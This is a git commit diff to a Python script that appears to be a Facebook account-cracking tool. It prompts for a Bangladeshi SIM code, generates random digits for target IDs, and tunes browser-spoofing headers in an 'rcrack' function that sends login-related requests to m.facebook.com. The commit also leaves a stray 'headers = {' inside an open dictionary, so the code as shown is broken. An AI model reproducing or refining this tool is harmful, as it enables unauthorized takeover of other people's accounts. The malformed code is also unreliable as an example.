9530d45c6e9daada46df9edde65fedbc5cd89d36
UZZALMAITRA <129254709+UZZALMAITRA@users.noreply.github.com>
2023-06-08 17:42:55 +0530

    Add files via upload

--- fuck.py
+++ fuck.py
@@ -112,7 +112,7 @@ def fuck():
     print("\033[38;5;46--------------------------------------------")
     print('\x1b[1;91m⧼ WORKING ⧽ :\x1b[1;92m BANGLADESH RANDOM CLONE ENJOY ')
     print("\033[38;5;46--------------------------------------------")
-    print('\033[1;32m[+] SIM CODE BD=> 016 • 017 • 018 • 019 • 013')
+    print('\033[1;32m[+] SIM CODE BD=> 016 • 017 • 018 • 019 ETC')
     print("\033[38;5;46--------------------------------------------")
     nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
     nudex = ''.join(random.choice(string.digits) for _ in range(2))
@@ -166,18 +166,14 @@ def rcrack(uid,pwx,tl):
             header_freefb = {'authority': 'm.facebook.com',
    		 'method': 'GET',
 		    'scheme': 'https', 
+		    headers = {
+		    'authority': 'm.facebook.com',
 		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-   		 'accept-language': 'en-US,en;q=0.9',
-   		 'cache-control': 'max-age=0',
- 		   'sec-ch-prefers-color-scheme': 'light',
-		    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-   		 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-		    'sec-ch-ua-mobile': '?0',
-		    'sec-ch-ua-platform': '"Linux"',
-		    'sec-ch-ua-platform-version': '""',
-		    'sec-fetch-dest': 'document',
-		    'sec-fetch-mode': 'navigate',
-		    'sec-fetch-site': 'same-origin',
+		    'accept-language': 'en-US,en;q=0.9',
+		    'cache-control': 'max-age=0',
+   		 'sec-fetch-dest': 'document',
+ 		   'sec-fetch-mode': 'navigate',
+		    'sec-fetch-site': 'none',
 		    'sec-fetch-user': '?1',
 		    'upgrade-insecure-requests': '1',
 		    'user-agent': pro}
